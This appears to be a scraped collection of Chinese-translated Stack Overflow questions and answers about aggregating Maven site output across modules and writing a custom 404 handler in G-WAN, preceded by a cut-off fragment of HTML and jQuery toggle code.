                    <td style="padding-right:0px">Email</td>
                    <td>: ac@gmail.com</td>
                </tr>
            </table>
        </div>
    </div>
</div>

$(document).ready(function() {
    $('.my_view').click(function(e) {
        $('.my_view').siblings('div').each(function(){$(this).hide()});
        $(this).siblings('div').toggle();
        e.stopPropagation();
    });
    $(document).click(function() {
        $('.my_view').siblings('div').fadeOut(200);
    });
}); 
```

# maven-3 - 多个模块中的多个 POM 的 Maven 站点登台

> ID：14847993
> 
> 赞同：2
> 
> 时间：2013-02-13T06:48:46.773
> 
> 标签：maven-3, pom.xml, maven-site-plugin

我有一个包含 5 个模块和子项目的项目。

```
Project
   - Module1
        -pom.xml
        --sub-proj1
            -pom.xml

   - Module2
        -pom.xml
        --sub-proj2
            -pom.xml

   - Module3
        -pom.xml
        --sub-proj3
            -pom.xml

   - Module4
        -pom.xml
        --sub-proj4
            -pom.xml

   - Module5
        -pom.xml
        --sub-proj5
            -pom.xml 
```

`mvn site`命令在每个模块下创建站点目录。我想将它放在一个公共目录中。

```
 <site>
   <id>${project.artifactId}-site</id>
   <url>./</url>
 </site> 
```

上面的配置说必须提供绝对路径。因此，当我提供绝对路径时，该站点会被推送到父项目`/target/staging`。

我面临的问题是父项目（Module1）的`index.html`其他主要`.html`内容正在被其他父链接替换，因此`index.html`在生成站点的目录中只能找到最后一个父项目。如何修复它/为站点目录指定正确的路径？

**另外**，我如何将所有报告（如 javadocs、corbetura 等）汇总到一个主要报告中。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-21T12:17:13.383

您应该尝试创建一个父 pom（在 下`project`），然后`mvn site`从那里运行它应该可以解决问题。

仅将其添加到您的`parent`pom

```
<site>
     <id>${project.artifactId}-site</id>
     <url>./</url>
</site> 
```

# customization - GWAN 的自定义 404 响应

> ID：14847994
> 
> 赞同：2
> 
> 时间：2013-02-13T06:48:47.163
> 
> 标签：customization, g-wan, http-error

当人们请求在 csp 文件夹中找不到的 servlet 时，它将显示“404 Not Found”响应

未找到

在此服务器上找不到请求的 URL。

有没有一种方法可以检查 servlet 是否存在，以创建自定义 404 页面？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T08:03:05.553

*Content-Type 和 Connections 处理程序*都可以在提供资源之前检查资源是否存在。

但是*连接处理程序*`HDL_HTTP_ERRORS`的状态允许您拦截 HTTP 错误以更改由 G-WAN 生成的默认回复。它在记录的 G-WAN API [Handler States](http://gwan.ch/api#handlers)中定义。

 *这很可能是您正在寻找的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T18:30:19.343

就像吉尔说的那样。您可以使用 HDL_HTTP_ERRORS 来拦截 HTTP 错误。为了更清楚，这里有一个示例连接处理程序，它将 404 错误替换为自定义错误消息。

```
#include "gwan.h" 
int init(int argc, char *argv[])
{
   u32 *states = (u32*)get_env(argv, US_HANDLER_STATES);
   *states =  (1 << HDL_HTTP_ERRORS);
   return 0;
}

int main(int argc, char *argv[])
{
   if((long)argv[0] != HDL_HTTP_ERRORS)
      return 255; // Continue if not an error

   // get the HTTP reply code
   int *status = (int*)get_env(argv, HTTP_CODE);
   if(!status || *status != 404)
      return 255; // Continue if not a 404 error

   static char custom_err[] = 
      "<!DOCTYPE HTML><html><head><title>404 Not Found</title><meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"><link href=\"/imgs/errors.css\" rel=\"stylesheet\" type=\"text/css\"></head>"
      "<body><h1>Not Found</h1>"
      "<p>This is a custom 404 not found error. What makes you think that this link exist?!!</p></body></html>";

   static char header[] = 
      "HTTP/1.1 %s\r\n"
      "Server:  G-WAN\r\n"
      "Date: %s\r\n"
      "Content-Type:  text/html; charset=UTF-8\r\n"
      "Content-Length: %u\r\n\r\n";

   int len = sizeof(custom_err)-1;
   char *date = (char*)get_env(argv, SERVER_DATE);
   // Set our http reply headers
   build_headers(argv, header,
             http_status(*status),
             date, // current server date
             len); // Reply length

   // Set our reply using our custom error
   set_reply(argv, custom_err, len, *status);

   return 2; // End request then send reply
}

void clean(int argc, char *argv[]) {} 
```

如果您从 servlet 返回 404 错误，请注意。确保你做一个

```
xbuf_empty(get_reply(argv)); 
```

清空回复缓冲区的内容。如果回复缓冲区中有任何内容，它将不会到达 HDL_HTTP_ERRORS。它只会回复回复缓冲区中的任何内容。*